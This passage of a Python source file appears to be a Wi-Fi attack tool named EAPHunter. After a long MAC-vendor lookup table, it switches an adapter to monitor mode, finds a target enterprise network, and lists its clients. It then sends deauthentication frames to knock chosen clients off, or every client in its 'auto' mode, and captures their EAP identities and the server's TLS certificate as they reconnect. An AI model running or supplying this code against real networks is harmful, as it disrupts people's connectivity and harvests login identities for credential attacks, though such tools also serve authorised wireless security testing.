    "00:30:78": "Cisco",  "00:30:79": "Cisco",  "00:30:80": "Cisco",
    "00:30:96": "Cisco",  "00:30:A3": "Cisco",  "00:30:F2": "Cisco",
    "00:40:96": "Cisco",  "00:50:0F": "Cisco",  "00:50:14": "Cisco",
    "00:50:2A": "Cisco",  "00:50:3E": "Cisco",  "00:50:50": "Cisco",
    "00:50:54": "Cisco",  "00:50:73": "Cisco",  "00:50:A2": "Cisco",
    "00:60:09": "Cisco",  "00:60:2F": "Cisco",  "00:60:3E": "Cisco",
    "00:60:47": "Cisco",  "00:60:5C": "Cisco",  "00:60:70": "Cisco",
    "00:60:83": "Cisco",  "00:60:97": "Cisco",  "00:E0:14": "Cisco",
    "00:E0:1E": "Cisco",  "00:E0:34": "Cisco",  "00:E0:4F": "Cisco",
    "00:E0:8F": "Cisco",  "00:E0:A3": "Cisco",  "00:E0:B0": "Cisco",
    "00:E0:F7": "Cisco",  "00:E0:F9": "Cisco",  "04:6C:9D": "Cisco",
    "04:DA:D2": "Cisco",  "08:17:35": "Cisco",  "0C:D9:96": "Cisco",
    "10:BD:18": "Cisco",  "1C:E6:C7": "Cisco",  "20:37:06": "Cisco",
    "20:3A:07": "Cisco",  "20:4C:03": "Cisco",  "24:E9:B3": "Cisco",
    "28:6F:7F": "Cisco",  "2C:31:24": "Cisco",  "30:37:A6": "Cisco",
    "34:6F:90": "Cisco",  "38:ED:18": "Cisco",  "40:F4:EC": "Cisco",
    "48:F8:B3": "Cisco",  "4C:E1:73": "Cisco",  "50:3D:E5": "Cisco",
    "54:75:D0": "Cisco",  "58:AC:78": "Cisco",  "5C:50:15": "Cisco",
    "64:F6:9D": "Cisco",  "6C:41:6A": "Cisco",  "70:CA:9B": "Cisco",
    "74:26:AC": "Cisco",  "74:A2:E6": "Cisco",  "78:BC:1A": "Cisco",
    "7C:69:F6": "Cisco",  "84:78:AC": "Cisco",  "88:5A:92": "Cisco",
    "8C:60:4F": "Cisco",  "90:B1:1C": "Cisco",  "A0:E0:AF": "Cisco",
    "A4:4C:11": "Cisco",  "A8:9D:21": "Cisco",  "AC:3A:67": "Cisco",
    "B0:C5:3C": "Cisco",  "B4:14:89": "Cisco",  "B8:38:61": "Cisco",
    "BC:16:65": "Cisco",  "C0:62:6B": "Cisco",  "C4:14:3C": "Cisco",
    "C8:9C:1D": "Cisco",  "CC:16:7E": "Cisco",  "D0:5F:B8": "Cisco",
    "D4:8C:B5": "Cisco",  "D8:B1:22": "Cisco",  "DC:8C:37": "Cisco",
    "E0:2F:6D": "Cisco",  "E4:C7:22": "Cisco",  "E8:B7:48": "Cisco",
    "EC:E1:A9": "Cisco",  "F0:29:29": "Cisco",  "F4:CF:E2": "Cisco",
    "F8:66:F2": "Cisco",  "FC:58:9A": "Cisco",
    # Aruba / HP Networking
    "00:0B:86": "Aruba",  "00:1A:1E": "Aruba",  "00:24:6C": "Aruba",
    "04:BD:88": "Aruba",  "08:6D:41": "Aruba",  "1C:28:AF": "Aruba",
    "20:4C:03": "Aruba",  "24:DE:C6": "Aruba",  "40:E3:D6": "Aruba",
    "6C:F3:7F": "Aruba",  "70:3A:0E": "Aruba",  "84:D4:7E": "Aruba",
    "94:B4:0F": "Aruba",  "AC:A3:1E": "Aruba",  "B4:5D:50": "Aruba",
    "D8:C7:C8": "Aruba",  "F0:5C:19": "Aruba",
    # Ubiquiti
    "00:15:6D": "Ubiquiti", "00:27:22": "Ubiquiti", "04:18:D6": "Ubiquiti",
    "0C:80:63": "Ubiquiti", "18:E8:29": "Ubiquiti", "24:A4:3C": "Ubiquiti",
    "44:D9:E7": "Ubiquiti", "60:22:32": "Ubiquiti", "68:72:51": "Ubiquiti",
    "74:83:C2": "Ubiquiti", "78:8A:20": "Ubiquiti", "80:2A:A8": "Ubiquiti",
    "B4:FB:E4": "Ubiquiti", "DC:9F:DB": "Ubiquiti", "E0:63:DA": "Ubiquiti",
    "F0:9F:C2": "Ubiquiti", "FC:EC:DA": "Ubiquiti",
    # TP-Link
    "00:27:19": "TP-Link", "14:CC:20": "TP-Link", "18:A6:F7": "TP-Link",
    "1C:61:B4": "TP-Link", "20:F4:1B": "TP-Link", "28:2C:B2": "TP-Link",
    "2C:4D:54": "TP-Link", "30:DE:4B": "TP-Link", "3C:84:6A": "TP-Link",
    "40:16:9F": "TP-Link", "44:94:FC": "TP-Link", "4C:09:D4": "TP-Link",
    "50:C7:BF": "TP-Link", "54:AF:97": "TP-Link", "58:D5:6E": "TP-Link",
    "5C:89:9A": "TP-Link", "60:32:B1": "TP-Link", "64:70:02": "TP-Link",
    "6C:5A:B0": "TP-Link", "70:4F:57": "TP-Link", "74:DA:38": "TP-Link",
    "78:44:FD": "TP-Link", "7C:8B:CA": "TP-Link", "80:35:C1": "TP-Link",
    "84:16:F9": "TP-Link", "90:F6:52": "TP-Link", "94:D9:B3": "TP-Link",
    "98:DA:C4": "TP-Link", "A0:F3:C1": "TP-Link", "A4:2B:B0": "TP-Link",
    "AC:84:C6": "TP-Link", "B0:4E:26": "TP-Link", "B8:A3:86": "TP-Link",
    "C4:6E:1F": "TP-Link", "C8:0E:77": "TP-Link", "CC:32:E5": "TP-Link",
    "D8:0D:17": "TP-Link", "E8:DE:27": "TP-Link", "F4:F2:6D": "TP-Link",
    "FC:D7:33": "TP-Link",
    # ASUS
    "00:0C:6E": "ASUS",  "00:0E:A6": "ASUS",  "00:11:2F": "ASUS",
    "00:13:D4": "ASUS",  "00:15:F2": "ASUS",  "00:17:31": "ASUS",
    "00:1A:92": "ASUS",  "00:1D:60": "ASUS",  "00:1E:8C": "ASUS",
    "00:1F:C6": "ASUS",  "00:22:15": "ASUS",  "00:23:54": "ASUS",
    "00:24:8C": "ASUS",  "00:26:18": "ASUS",  "04:92:26": "ASUS",
    "08:62:66": "ASUS",  "10:BF:48": "ASUS",  "14:DA:E9": "ASUS",
    "18:31:BF": "ASUS",  "1C:87:2C": "ASUS",  "20:CF:30": "ASUS",
    "2C:4E:7E": "ASUS",  "30:85:A9": "ASUS",  "38:2C:4A": "ASUS",
    "3C:97:0E": "ASUS",  "40:16:7E": "ASUS",  "48:5B:39": "ASUS",
    "4C:ED:FB": "ASUS",  "50:46:5D": "ASUS",  "54:04:A6": "ASUS",
    "58:11:22": "ASUS",  "5C:FF:35": "ASUS",  "60:45:CB": "ASUS",
    "6C:62:6D": "ASUS",  "74:D0:2B": "ASUS",  "78:24:AF": "ASUS",
    "7C:10:C9": "ASUS",  "80:1F:02": "ASUS",  "84:A9:C4": "ASUS",
    "88:D7:F6": "ASUS",  "90:E6:BA": "ASUS",  "94:DE:80": "ASUS",
    "98:EE:CB": "ASUS",  "A0:F3:E4": "ASUS",  "AC:22:0B": "ASUS",
    "AC:9E:17": "ASUS",  "B0:6E:BF": "ASUS",  "B4:2E:99": "ASUS",
    "BC:AE:C5": "ASUS",  "C8:60:00": "ASUS",  "D8:50:E6": "ASUS",
    "E0:3F:49": "ASUS",  "E4:02:9B": "ASUS",  "E8:94:F6": "ASUS",
    "F8:32:E4": "ASUS",  "FC:34:97": "ASUS",
    # Netgear
    "00:09:5B": "Netgear", "00:0F:B5": "Netgear", "00:14:6C": "Netgear",
    "00:18:4D": "Netgear", "00:1B:2F": "Netgear", "00:1E:2A": "Netgear",
    "00:22:3F": "Netgear", "00:24:B2": "Netgear", "00:26:F2": "Netgear",
    "20:4E:7F": "Netgear", "28:C6:8E": "Netgear", "2C:B0:5D": "Netgear",
    "30:46:9A": "Netgear", "3C:37:86": "Netgear", "44:94:FC": "Netgear",
    "4C:60:DE": "Netgear", "6C:B0:CE": "Netgear", "74:44:01": "Netgear",
    "84:1B:5E": "Netgear", "A0:21:B7": "Netgear", "C0:3F:0E": "Netgear",
    "C4:04:15": "Netgear", "E0:46:9A": "Netgear", "E4:F4:C6": "Netgear",
    # D-Link
    "00:05:5D": "D-Link",  "00:0D:88": "D-Link",  "00:0F:3D": "D-Link",
    "00:11:95": "D-Link",  "00:13:46": "D-Link",  "00:15:E9": "D-Link",
    "00:17:9A": "D-Link",  "00:19:5B": "D-Link",  "00:1B:11": "D-Link",
    "00:1C:F0": "D-Link",  "00:1E:58": "D-Link",  "00:21:91": "D-Link",
    "00:22:B0": "D-Link",  "00:24:01": "D-Link",  "00:26:5A": "D-Link",
    "1C:7E:E5": "D-Link",  "1C:AF:F7": "D-Link",  "28:10:7B": "D-Link",
    "34:08:04": "D-Link",  "40:9B:CD": "D-Link",  "5C:D9:98": "D-Link",
    "78:54:2E": "D-Link",  "90:94:E4": "D-Link",  "B8:A3:86": "D-Link",
    "C8:BE:19": "D-Link",  "CC:B2:55": "D-Link",  "F0:7D:68": "D-Link",
    # Xiaomi
    "00:9E:C8": "Xiaomi",  "04:CF:8C": "Xiaomi",  "0C:1D:AF": "Xiaomi",
    "14:F6:5A": "Xiaomi",  "18:59:36": "Xiaomi",  "28:6C:07": "Xiaomi",
    "34:80:B3": "Xiaomi",  "38:A4:ED": "Xiaomi",  "50:8F:4C": "Xiaomi",
    "58:44:98": "Xiaomi",  "64:09:80": "Xiaomi",  "64:B4:73": "Xiaomi",
    "74:51:BA": "Xiaomi",  "78:02:F8": "Xiaomi",  "98:FA:E3": "Xiaomi",
    "9C:99:A0": "Xiaomi",  "A0:86:C6": "Xiaomi",  "AC:C1:EE": "Xiaomi",
    "B0:E2:35": "Xiaomi",  "D4:97:0B": "Xiaomi",  "F0:B4:29": "Xiaomi",
    "F4:8B:32": "Xiaomi",  "FC:64:BA": "Xiaomi",
    # OnePlus
    "04:D6:AA": "OnePlus", "08:05:81": "OnePlus", "40:25:C2": "OnePlus",
    "94:65:2D": "OnePlus", "AC:37:43": "OnePlus",
    # Amazon
    "00:BB:3A": "Amazon",  "0C:47:C9": "Amazon",  "10:AE:60": "Amazon",
    "18:74:2E": "Amazon",  "28:EF:01": "Amazon",  "34:D2:70": "Amazon",
    "38:F7:3D": "Amazon",  "40:B4:CD": "Amazon",  "44:65:0D": "Amazon",
    "50:DC:E7": "Amazon",  "54:88:0E": "Amazon",  "6C:56:97": "Amazon",
    "74:75:48": "Amazon",  "84:D6:D0": "Amazon",  "A0:02:DC": "Amazon",
    "AC:63:BE": "Amazon",  "B4:7C:9C": "Amazon",  "F0:27:2D": "Amazon",
    "FC:65:DE": "Amazon",
    # Raspberry Pi Foundation
    "28:CD:C1": "Raspberry Pi", "2C:CF:67": "Raspberry Pi",
    "B8:27:EB": "Raspberry Pi", "D8:3A:DD": "Raspberry Pi",
    "DC:A6:32": "Raspberry Pi", "E4:5F:01": "Raspberry Pi",
    # Nintendo
    "00:09:BF": "Nintendo", "00:16:56": "Nintendo", "00:17:AB": "Nintendo",
    "00:19:1D": "Nintendo", "00:1A:E9": "Nintendo", "00:1B:EA": "Nintendo",
    "00:1C:BE": "Nintendo", "00:1E:35": "Nintendo", "00:1F:32": "Nintendo",
    "00:21:47": "Nintendo", "00:22:4C": "Nintendo", "00:24:44": "Nintendo",
    "00:25:A0": "Nintendo", "40:F4:07": "Nintendo", "58:BD:A3": "Nintendo",
    "78:A2:A0": "Nintendo", "8C:56:C5": "Nintendo", "9C:E6:35": "Nintendo",
    "A4:C0:E1": "Nintendo", "B8:8A:EC": "Nintendo", "CC:9E:00": "Nintendo",
    "E0:E7:51": "Nintendo",
    # Sony
    "00:01:4A": "Sony",  "00:04:1F": "Sony",  "00:13:A9": "Sony",
    "00:15:C1": "Sony",  "00:16:B8": "Sony",  "00:18:00": "Sony",
    "00:19:C5": "Sony",  "00:1A:75": "Sony",  "00:1D:0D": "Sony",
    "00:1E:A9": "Sony",  "00:22:A9": "Sony",  "00:24:BE": "Sony",
    "00:25:E7": "Sony",  "04:BD:70": "Sony",  "0C:E7:25": "Sony",
    "10:4F:58": "Sony",  "20:0A:4B": "Sony",  "28:3F:69": "Sony",
    "30:17:C8": "Sony",  "3C:01:EF": "Sony",  "40:B8:37": "Sony",
    "54:9F:13": "Sony",  "6C:AD:F8": "Sony",  "78:84:3C": "Sony",
    "84:C7:EA": "Sony",  "98:0C:82": "Sony",  "AC:9B:0A": "Sony",
    "B0:C0:90": "Sony",  "D0:27:88": "Sony",  "E0:AE:5E": "Sony",
    "F4:F5:24": "Sony",
    # Fortinet
    "00:09:0F": "Fortinet", "00:0F:8F": "Fortinet", "08:5B:0E": "Fortinet",
    "18:81:0E": "Fortinet", "1C:D5:3A": "Fortinet", "58:F3:9C": "Fortinet",
    "70:4C:A5": "Fortinet", "90:6C:AC": "Fortinet", "B8:CA:3A": "Fortinet",
    # Palo Alto Networks
    "00:1B:17": "Palo Alto", "04:8D:38": "Palo Alto", "2C:24:C1": "Palo Alto",
    "3C:EF:8C": "Palo Alto", "5C:FC:66": "Palo Alto",
    # Juniper
    "00:10:DB": "Juniper", "00:12:1E": "Juniper", "00:17:CB": "Juniper",
    "00:19:E2": "Juniper", "00:1B:C0": "Juniper", "00:21:59": "Juniper",
    "00:23:9C": "Juniper", "00:26:88": "Juniper", "28:8A:1C": "Juniper",
    "30:B6:4F": "Juniper", "40:B4:F0": "Juniper", "5C:45:27": "Juniper",
    "64:87:88": "Juniper", "A4:4C:11": "Juniper",
    # VMware (virtual NICs, common in enterprise environments)
    "00:0C:29": "VMware",  "00:50:56": "VMware",  "00:05:69": "VMware",
    # Broadcom (WiFi chipsets)
    "00:10:18": "Broadcom", "00:90:4C": "Broadcom",
    # Murata (common IoT WiFi modules)
    "00:1D:C9": "Murata",  "04:A3:16": "Murata",  "64:E8:33": "Murata",
    "80:C9:55": "Murata",  "A4:DA:32": "Murata",
    # Realtek (common WiFi adapters)
    "00:E0:4C": "Realtek",  "52:54:00": "Realtek",
    # Texas Instruments
    "00:17:E9": "Texas Instruments", "00:18:31": "Texas Instruments",
    "D4:F5:13": "Texas Instruments",
}


# ── Process killer (replaces airmon-ng check kill) ───────────────────────────
def _kill_interfering():
    targets = {"wpa_supplicant", "NetworkManager", "dhclient", "dhcpcd"}
    for pid_dir in Path("/proc").iterdir():
        if not pid_dir.name.isdigit():
            continue
        try:
            comm = (pid_dir / "comm").read_text().strip()
            if comm in targets:
                os.kill(int(pid_dir.name), signal.SIGTERM)
                info(f"Killed {comm} ({pid_dir.name})")
        except Exception:
            pass


# ── OUI vendor lookup (baked-in list → Scapy fallback → UNKNOWN) ─────────────
def _vendor(mac: str) -> str:
    oui = mac.upper()[:8]
    # Baked-in table first (fast, no dependency)
    if oui in _BUILTIN_OUI:
        return _BUILTIN_OUI[oui]
    # Scapy manuf DB fallback
    try:
        result = _sc.conf.manufdb._get_manuf(mac) if _sc else None
        # Reject results that look like a MAC/OUI prefix (Scapy's "not found" response)
        if result and not re.match(r"^[0-9A-Fa-f]{2}[:\-]", result):
            return result
    except Exception:
        pass
    return "UNKNOWN"


# ── TLS certificate extraction from raw EAP payload bytes ────────────────────
def _parse_tls_cert_chain(data: bytes) -> list[bytes]:
    certs, off = [], 0
    while off + 5 <= len(data):
        ctype   = data[off]
        rec_len = int.from_bytes(data[off + 3: off + 5], "big")
        off += 5
        if off + rec_len > len(data):
            break
        rec = data[off: off + rec_len]
        off += rec_len
        if ctype != 22:
            continue
        hs = 0
        while hs + 4 <= len(rec):
            hs_type = rec[hs]
            hs_len  = int.from_bytes(rec[hs + 1: hs + 4], "big")
            hs += 4
            if hs + hs_len > len(rec):
                break
            body = rec[hs: hs + hs_len]
            hs  += hs_len
            if hs_type != 11 or len(body) < 3:
                continue
            list_len = int.from_bytes(body[0:3], "big")
            c = 3
            while c + 3 <= 3 + list_len and c + 3 <= len(body):
                c_len = int.from_bytes(body[c: c + 3], "big")
                c += 3
                if c + c_len > len(body):
                    break
                if c_len:
                    certs.append(body[c: c + c_len])
                c += c_len
    return certs


def _certs_from_pcap(pcap_file: str) -> list[tuple[bytes, str, str]]:
    pkts = _sc.rdpcap(pcap_file)
    frags: dict[int, bytes] = {}
    results, seen = [], set()
    for pkt in pkts:
        if not pkt.haslayer(_sc.EAP):
            continue
        eap = pkt[_sc.EAP]
        if eap.code != 1 or eap.type not in (13, 21, 25):
            continue
        src = pkt[_sc.Dot11].addr2 if pkt.haslayer(_sc.Dot11) else "?"
        dst = pkt[_sc.Dot11].addr1 if pkt.haslayer(_sc.Dot11) else "?"
        try:
            raw = bytes(eap.payload)
        except Exception:
            continue
        if not raw:
            continue
        flags    = raw[0]
        has_len  = bool(flags & 0x80)
        more     = bool(flags & 0x40)
        tls_data = raw[1 + (4 if has_len else 0):]
        eid      = eap.id
        frags[eid] = frags.get(eid, b"") + tls_data
        if not more:
            for cert_der in _parse_tls_cert_chain(frags.pop(eid)):
                fp = hashlib.md5(cert_der).hexdigest()
                if fp not in seen:
                    seen.add(fp)
                    results.append((cert_der, src, dst))
    return results


# ── Certificate display (cryptography) ───────────────────────────────────────
def _display_cert(cert_der: bytes):
    try:
        from cryptography import x509
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import hashes
        cert = x509.load_der_x509_certificate(cert_der, default_backend())
        print(f"  Subject    : {cert.subject.rfc4514_string()}")
        print(f"  Issuer     : {cert.issuer.rfc4514_string()}")
        print(f"  Not Before : {cert.not_valid_before}")
        print(f"  Not After  : {cert.not_valid_after}")
        fp = cert.fingerprint(hashes.SHA256()).hex()
        print(f"  SHA-256    : {':'.join(fp[i:i+2] for i in range(0, len(fp), 2))}")
        try:
            san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
            for dns in san.value.get_values_for_type(x509.DNSName):
                print(f"  SAN        : {dns}")
        except Exception:
            pass
    except ImportError:
        warn("cryptography not available — DER/PEM saved but details not shown")
    except Exception as e:
        warn(f"Cert parse error: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class EAPHunter:
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    def __init__(self, essid: str, iface: str, out_dir: str, capture_time: int):
        self.essid        = essid
        self.iface        = iface
        self.out_dir      = Path(out_dir)
        self.capture_time = capture_time   # seconds for deauth+capture phase

        self.bssid   = ""
        self.channel = 0

        # Shared client table — updated by background sniff thread
        self._client_table: dict[str, dict] = {}
        self._client_lock  = threading.Lock()

        self.active_pcap  = ""
        self.identities: list[str] = []

        self._tmp = Path(tempfile.mkdtemp(prefix="eaphunter_"))

    # ── Entry point ──────────────────────────────────────────────────────────

    def run(self):
        try:
            _require_scapy()
            self._check_deps()
            self._enable_monitor()
            self._discover_ap()
            self._monitor_loop()
        except KeyboardInterrupt:
            print("\n\n  [!] Interrupted.")
        finally:
            self._cleanup()

    # ── Dependency check ─────────────────────────────────────────────────────

    def _check_deps(self):
        for cmd in ("iw", "ip"):
            if not shutil.which(cmd):
                die(f"'{cmd}' not found — install iproute2 / iw")

    # ── Monitor mode ─────────────────────────────────────────────────────────

    def _enable_monitor(self):
        section("Monitor Mode")
        info("Killing interfering processes …")
        _kill_interfering()
        info(f"Setting {self.iface} to monitor mode …")
        for cmd in (
            ["ip", "link", "set", self.iface, "down"],
            ["iw", "dev",  self.iface, "set", "type", "monitor"],
            ["ip", "link", "set", self.iface, "up"],
        ):
            r = subprocess.run(cmd, capture_output=True)
            if r.returncode != 0:
                die(f"Command failed: {' '.join(cmd)}\n{r.stderr.decode()}")
        ok(f"Monitor mode active on {self.iface}")

    def _restore_managed(self):
        for cmd in (
            ["ip", "link", "set", self.iface, "down"],
            ["iw", "dev",  self.iface, "set", "type", "managed"],
            ["ip", "link", "set", self.iface, "up"],
        ):
            subprocess.run(cmd, capture_output=True)

    def _set_channel(self, ch: int):
        subprocess.run(["iw", "dev", self.iface, "set", "channel", str(ch)],
                       capture_output=True)

    def _hop_channels(self, stop: threading.Event, current: dict):
        while not stop.is_set():
            for ch in CHANNELS:
                if stop.is_set():
                    return
                r = subprocess.run(["iw", "dev", self.iface, "set", "channel", str(ch)],
                                   capture_output=True)
                if r.returncode == 0:
                    current["ch"] = ch
                time.sleep(0.25)

    # ── AP Discovery ─────────────────────────────────────────────────────────

    def _discover_ap(self):
        section("AP Discovery")
        found, current = {}, {"ch": 1}
        stop_hop = threading.Event()

        def handle(pkt):
            if not (pkt.haslayer(_sc.Dot11Beacon) or pkt.haslayer(_sc.Dot11ProbeResp)):
                return
            bssid = pkt[_sc.Dot11].addr3 or pkt[_sc.Dot11].addr2
            essid_bytes, ds_ch = b"", 0
            elt = pkt[_sc.Dot11Elt] if pkt.haslayer(_sc.Dot11Elt) else None
            while isinstance(elt, _sc.Dot11Elt):
                if elt.ID == 0:
                    essid_bytes = elt.info
                elif elt.ID == 3 and elt.info:
                    ds_ch = elt.info[0]
                elt = elt.payload
            try:
                essid = essid_bytes.decode(errors="replace")
            except Exception:
                return
            if essid == self.essid and not found:
                found["bssid"]   = bssid
                found["channel"] = ds_ch or current["ch"]

        hop = threading.Thread(target=self._hop_channels, args=(stop_hop, current), daemon=True)
        hop.start()
        info(f"Scanning for '{self.essid}' …")

        _sc.sniff(iface=self.iface, prn=handle,
                  stop_filter=lambda _: bool(found),
                  timeout=60, store=False)

        stop_hop.set()
        if not found:
            die(f"'{self.essid}' not found — AP out of range or SSID hidden.")

        self.bssid   = found["bssid"]
        self.channel = found["channel"]
        ok(f"SSID    : {self.essid}")
        ok(f"BSSID   : {self.bssid}")
        ok(f"Channel : {self.channel}")
        self._set_channel(self.channel)

    # ── Main monitoring loop ──────────────────────────────────────────────────

    def _monitor_loop(self):
        stop_sniff = threading.Event()

        def sniff_loop():
            while not stop_sniff.is_set():
                _sc.sniff(iface=self.iface, prn=self._handle_frame,
                          timeout=SNIFF_SLICE, store=False)

        sniff_thread = threading.Thread(target=sniff_loop, daemon=True)
        sniff_thread.start()

        prev_lines = 0
        try:
            while True:
                # Redraw client table in-place
                if prev_lines > 0:
                    print(f"\033[{prev_lines}A\r\033[J", end="", flush=True)
                prev_lines = self._print_client_table()

                # Non-blocking wait for user input (refresh every 3s)
                ready, _, _ = _select.select([sys.stdin], [], [], 3.0)
                if not ready:
                    continue

                line = sys.stdin.readline().strip()
                prev_lines = 0   # reprint fresh after any action

                if line.lower() in ("q", "quit", "exit"):
                    break

                with self._client_lock:
                    clients = _sorted_clients(self._client_table)

                # ── Auto mode ─────────────────────────────────────────────
                if line.lower() == "auto":
                    undeauthed = [c for c in clients if not c["deauthed"]]
                    if not undeauthed:
                        warn("No undeauthed clients remaining.")
                        continue
                    eta_secs = len(undeauthed) * (self.capture_time + 60)
                    eta_str  = time.strftime("%H:%M:%S",
                                             time.localtime(time.time() + eta_secs))
                    info(f"Auto mode: {len(undeauthed)} client(s) to deauth, "
                         f"ETA {eta_str} (~{eta_secs//60}m)")

                    stop_sniff.set()
                    sniff_thread.join(timeout=SNIFF_SLICE + 1)
                    stop_sniff.clear()

                    import random
                    random.shuffle(undeauthed)
                    for entry in undeauthed:
                        target = entry["mac"]
                        info(f"Auto deauth: {target}")
                        self._deauth_and_capture(target)
                        self._extract_cert(self.active_pcap)
                        with self._client_lock:
                            if target in self._client_table:
                                self._client_table[target]["deauthed"] = True
                        info(f"Waiting 60s before next target …")
                        time.sleep(60)

                    sniff_thread = threading.Thread(target=sniff_loop, daemon=True)
                    sniff_thread.start()
                    info("Auto mode complete. Returning to monitoring …")
                    time.sleep(0.5)
                    continue

                # ── Manual selection ──────────────────────────────────────
                if not line.isdigit():
                    continue

                idx = int(line)
                if not (1 <= idx <= len(clients)):
                    warn(f"Enter 1-{len(clients)}, 'auto', or 'q'.")
                    continue

                target = clients[idx - 1]["mac"]

                # ── Pause monitoring ──────────────────────────────────────
                stop_sniff.set()
                sniff_thread.join(timeout=SNIFF_SLICE + 1)
                stop_sniff.clear()

                # ── Deauth + capture ──────────────────────────────────────
                self._deauth_and_capture(target)
                self._extract_cert(self.active_pcap)

                # Mark as deauthed
                with self._client_lock:
                    if target in self._client_table:
                        self._client_table[target]["deauthed"] = True

                # ── Resume monitoring ─────────────────────────────────────
                sniff_thread = threading.Thread(target=sniff_loop, daemon=True)
                sniff_thread.start()
                info("Returning to monitoring …")
                time.sleep(0.5)

        finally:
            stop_sniff.set()

    # ── Background frame handler ──────────────────────────────────────────────

    def _handle_frame(self, pkt):
        if not pkt.haslayer(_sc.Dot11):
            return
        dot11 = pkt[_sc.Dot11]
        if dot11.type != 2:
            return
        fc      = int(dot11.FCfield)
        to_ds   = bool(fc & 0x01)
        from_ds = bool(fc & 0x02)
        if to_ds and not from_ds:
            client_mac, ap_mac = dot11.addr2, dot11.addr1
        elif from_ds and not to_ds:
            client_mac, ap_mac = dot11.addr1, dot11.addr2
        else:
            return
        if not ap_mac or ap_mac.lower() != self.bssid.lower():
            return
        if not client_mac or not re.match(r"^[0-9a-f:]{17}$", client_mac.lower()):
            return
        if client_mac.lower() in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
            return

        rssi = ""
        try:
            rt = pkt.getlayer(_sc.RadioTap)
            if rt and hasattr(rt, "dBm_AntSignal"):
                rssi = str(rt.dBm_AntSignal)
        except Exception:
            pass

        with self._client_lock:
            entry = self._client_table.setdefault(client_mac, {
                "mac":       client_mac,
                "power":     rssi,
                "packets":   0,
                "deauthed":  False,
                "first_seen": time.time(),
                "last_seen": time.time(),
            })
            entry["packets"]  += 1
            entry["last_seen"] = time.time()
            if rssi:
                entry["power"] = rssi

    # ── Client table display (returns number of lines printed) ───────────────

    def _print_client_table(self) -> int:
        ts = time.strftime("%H:%M:%S")
        with self._client_lock:
            clients = _sorted_clients(self._client_table)

        bar = "=" * 62
        rows = []
        rows.append(f"  {bar}")
        rows.append(f"  EAPHunter  |  {self.essid}  |  {self.bssid}  |  ch {self.channel}  |  {ts}")
        rows.append(f"  {bar}")

        if not clients:
            rows.append("  [*] No clients observed …")
        else:
            rows.append(
                f"  {'#':<5}  {'MAC ADDRESS':<20}  {'PWR':>5}  {'PKTS':>6}"
                f"  {'VENDOR':<25}  STATUS"
            )
            rows.append(f"  {'─'*5}  {'─'*20}  {'─'*5}  {'─'*6}  {'─'*25}  {'─'*10}")
            for i, c in enumerate(clients, 1):
                vendor = _vendor(c["mac"])[:25]
                pwr    = c["power"] or "?"
                status = "[deauthed]" if c["deauthed"] else ""
                rows.append(
                    f"  [{i}]    {c['mac']:<20}  {pwr:>5}  {c['packets']:>6}"
                    f"  {vendor:<25}  {status}"
                )

        rows.append("")

        for row in rows:
            print(row)

        n_clients = len(clients)
        prompt = f"  [?] Select [1-{n_clients}], 'auto', or 'q': " if n_clients else \
                 "  [?] Waiting for clients … ('q' to quit): "
        print(prompt, end="", flush=True)

        return len(rows)   # prompt sits on the last line, no extra newline

    # ── Deauth + Capture (sniff starts BEFORE deauth is sent) ────────────────

    def _deauth_and_capture(self, target_mac: str):
        section("Deauthentication + Handshake Capture")
        self.active_pcap = str(self.out_dir / f"eap_handshake_{target_mac.replace(':', '')}.pcap")
        seen_ids:     set[str] = set()
        seen_methods: set[str] = set()

        def handle(pkt):
            if not pkt.haslayer(_sc.EAP):
                return
            eap = pkt[_sc.EAP]
            if eap.code == 2 and eap.type == 1:
                try:
                    identity = eap.identity.decode(errors="replace").strip()
                except Exception:
                    return
                if identity and identity not in seen_ids:
                    seen_ids.add(identity)
                    print(f"\r  [+] EAP Identity  : {identity}          ")
                    self._record_identity(identity)
            elif eap.code == 1 and eap.type not in (0, 1):
                name = EAP_METHODS.get(eap.type, f"type {eap.type}")
                if name not in seen_methods:
                    seen_methods.add(name)
                    print(f"\r  [!] EAP Method    : {name}          ")

        # Start capture BEFORE sending deauth
        captured = []
        def _sniff():
            captured.extend(
                _sc.sniff(iface=self.iface, prn=handle, timeout=self.capture_time)
            )

        sniff_thread = threading.Thread(target=_sniff, daemon=True)
        sniff_thread.start()
        time.sleep(0.3)   # give libpcap time to open socket

        # Send deauth (both directions)
        warn(f"Sending deauth frames  ->  {target_mac}  (AP: {self.bssid})")
        for src, dst in [(self.bssid, target_mac), (target_mac, self.bssid)]:
            pkt = (_sc.RadioTap() /
                   _sc.Dot11(addr1=dst, addr2=src, addr3=self.bssid, type=0, subtype=12) /
                   _sc.Dot11Deauth(reason=7))
            _sc.sendp(pkt, iface=self.iface, count=10, inter=0.1, verbose=False)
        ok("Deauth frames sent — waiting for EAP exchange …")

        done = threading.Event()
        ct = threading.Thread(target=_countdown_thread,
                              args=("Capturing handshake", self.capture_time, done), daemon=True)
        ct.start()
        sniff_thread.join()
        done.set(); ct.join()

        if captured:
            _sc.wrpcap(self.active_pcap, captured)
            ok(f"Pcap saved: {self.active_pcap}  ({len(captured)} packets)")
        else:
            warn("No packets captured.")

        if not seen_ids:
            warn("No live identities — parsing pcap …")
            self._pcap_identities(self.active_pcap)

    # ── Certificate extraction ────────────────────────────────────────────────

    def _extract_cert(self, pcap_file: str) -> bool:
        section("EAP Certificate Extraction")
        if not pcap_file or not Path(pcap_file).exists():
            warn("No pcap available.")
            return False

        info(f"Parsing {Path(pcap_file).name} for EAP-TLS server certificate …")
        cert_list = _certs_from_pcap(pcap_file)

        if not cert_list:
            warn("No EAP certificate found in this capture.")
            return False

        cert_der, src_mac, dst_mac = cert_list[0]

        der_path = self.out_dir / "eap_server_cert.der"
        pem_path = self.out_dir / "eap_server_cert.pem"
        der_path.write_bytes(cert_der)

        import base64
        b64 = base64.b64encode(cert_der).decode()
        pem_path.write_text(
            "-----BEGIN CERTIFICATE-----\n"
            + "\n".join(b64[i:i+64] for i in range(0, len(b64), 64))
            + "\n-----END CERTIFICATE-----\n"
        )

        ok(f"AP {src_mac}  ->  Client {dst_mac}")
        ok(f"Saved DER : {der_path}")
        ok(f"Saved PEM : {pem_path}")
        if len(cert_list) > 1:
